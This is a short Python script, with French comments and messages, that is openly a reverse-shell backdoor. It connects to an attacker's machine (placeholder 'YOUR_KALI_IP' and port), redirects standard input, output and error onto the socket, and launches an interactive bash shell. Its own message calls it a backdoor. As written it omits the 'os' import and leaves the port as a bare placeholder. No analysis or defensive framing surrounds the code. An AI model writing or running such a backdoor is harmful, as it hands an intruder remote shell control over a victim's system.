import socket
import subprocess

def connect_to_attacker(attacker_ip, attacker_port):
    """Tente de créer une connexion au serveur de l'attaquant."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, attacker_port))
        return s
    except Exception as e:
        print(f"Erreur lors de la connexion à l'attaquant : {e}")
        return None

def execute_reverse_shell(socket, attacker_ip, attacker_port):
    """Exécute un shell inversé en utilisant la connexion établie."""
    try:
        # Rediriger stdin, stdout, et stderr vers la socket
        os.dup2(socket.fileno(), 0)
        os.dup2(socket.fileno(), 1)
        os.dup2(socket.fileno(), 2)
        # Exécuter un shell interactif
        subprocess.call(["/bin/bash", "-i"])
    except Exception as e:
        print(f"Erreur lors de l'exécution de la commande shell : {e}")

def main():
    attacker_ip = "YOUR_KALI_IP"  # À remplacer par l'IP réelle
    attacker_port = YOUR_LISTENING_PORT  # À remplacer par le port d'écoute réel

    # Établir une connexion avec l'attaquant
    attacker_conn = connect_to_attacker(attacker_ip, attacker_port)
    if attacker_conn:
        print("Connexion établie avec l'attaquant.")
        execute_reverse_shell(attacker_conn, attacker_ip, attacker_port)
    else:
        print("Impossible d'établir une connexion avec l'attaquant. La backdoor ne peut pas fonctionner.")

if __name__ == "__main__":
    main()
